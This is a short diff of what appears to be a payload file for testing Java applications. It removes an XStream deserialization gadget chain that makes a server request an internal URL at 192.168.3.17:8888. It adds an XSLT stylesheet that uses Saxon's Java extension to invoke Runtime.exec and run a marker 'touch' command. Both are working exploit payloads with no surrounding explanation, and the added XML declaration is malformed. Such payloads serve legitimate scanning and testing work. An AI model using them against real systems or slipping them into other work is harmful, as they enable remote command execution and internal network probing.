@@ -1,18 +1,6 @@
-<map>
-	<version>2</version>
-   <entry>
-      <jdk.nashorn.internal.objects.NativeString>
-         <flags>0</flags>
-         <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
-            <dataHandler>
-               <dataSource class="javax.activation.URLDataSource">
-                  <url>http://192.168.3.17:8888/internal/:</url>
-               </dataSource>
-               <transferFlavors/>
-            </dataHandler>
-            <dataLen>0</dataLen>
-         </value>
-      </jdk.nashorn.internal.objects.NativeString>
-      <string>test</string>
-   </entry>
-</map>
+<xml version="1.0"?>
+<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
+<xsl:template match="/">
+<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'touch /tmp/11112222')" xmlns:Runtime="java:java.lang.Runtime"/>
+</xsl:template>.
+</xsl:stylesheet>
